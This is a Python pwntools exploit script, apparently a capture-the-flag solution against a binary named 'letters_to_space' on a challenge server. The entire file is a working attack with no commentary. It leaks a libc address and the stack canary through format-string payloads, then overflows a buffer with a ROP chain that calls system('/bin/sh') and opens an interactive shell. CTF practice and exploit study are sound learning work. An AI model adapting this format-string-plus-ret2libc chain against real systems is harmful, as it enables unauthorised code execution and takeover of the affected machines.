# coding: utf-8
from pwn import *

context.binary = elf = ELF('./letters_to_space')
libc = elf.libc
# libc = ELF('./lib/libc.so.6')
# p = process('./letters_to_space')
p = remote('challenges1.whitehacks.xyz', 53890)

def interact(sender, recipient, content, another):
    p.sendlineafter(b"sender: ", sender)
    p.sendlineafter(b"recipient: ", recipient)
    p.sendlineafter(b"contents: ", content) 
    p.recvuntil("Dear " + recipient + ",")
    p.recvline()
    p.recvline()
    leak = int(p.recvline(), 16)
    p.sendlineafter(b"> ", another)
    return leak


leak = interact("a", "b", "%23$p", "1")
libc.address = leak - 0x26fc0 - 243
binsh = next(libc.search(b'/bin/sh'))


canary = interact("a", "b", "%21$p", "1")

log.info(f"/bin/sh @ {hex(binsh)}")
log.info(f"libc @ {hex(libc.address)}")
log.info(f"canary @ {hex(canary)}")

rop = ROP(libc)
rop.call(rop.ret)
rop.system(binsh)

print(rop.dump())

payload = b"A"*40 + p64(canary)
payload += b"B"*8 + rop.chain()

interact(payload, "a", "b", "2")
p.sendline("2")

p.interactive()
